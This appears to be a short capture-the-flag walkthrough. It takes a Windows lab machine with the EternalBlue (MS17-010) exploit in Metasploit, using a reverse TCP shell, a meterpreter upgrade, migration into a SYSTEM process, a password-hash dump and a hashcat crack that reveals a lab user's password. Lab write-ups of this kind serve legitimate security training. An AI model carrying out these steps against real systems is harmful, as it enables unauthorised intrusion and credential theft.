Gain Access

  1. Start metasploit
  2. Search an exploit for (ms170-010)
  3. Use the exploit
1

msf> exploit/windows/smb/ms17_010_eternalblue
  1. Set RHOSTS value
  2. Set payload
1

set payload windows/x64/shell/reverse_tcp
  1. Run the exploit & pray :D
  2. If succeed. Background this shell (CTRL+Z)

Escalate

Escalate privileges & upgrade shells in metasploit.

  1. Search shell_to_meterpreter - Result: post/multi/manage/shell_to_meterpreter
  2. Use it :D
  3. set session & run (be patient & wait) (NOTE: If you dont know how, go back & learn to use metasploit :D)
  4. List all of the processes running via thex ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
  5. Migrate to this process using the ‘migrate PROCESS_ID’ command where the process id is the one you just wrote down in the previous step.

Cracking

Dump the non-default user’s password and crack it!

  1. Within our elevated meterpreter shell, dump all of the passwords.
  2. Copy the password hash & crack it.
1

$ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt

Result: Jon:alqfna22
